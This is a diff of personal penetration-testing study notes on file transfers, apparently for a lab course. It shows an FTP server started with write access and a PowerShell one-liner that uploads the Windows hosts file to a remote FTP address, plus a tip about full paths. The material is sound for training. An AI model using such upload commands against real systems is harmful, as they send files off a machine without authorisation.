@@ -128,6 +128,7 @@ Harmj0y has compiled an extensive list of PowerShell download cradles [here](htt
 	- `python3 -m pyftpdlib --port 21 --write`
 - PowerShell upload function to upload a file to our FTP Server:
 	- `(New-Object Net.WebClient).UploadFile('ftp://10.10.15.93/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`
+		- ALWAYS **use full path if getting error "2 arguments"**
 	![[Pasted image 20250622070910.png]]
 
 # **Labs**
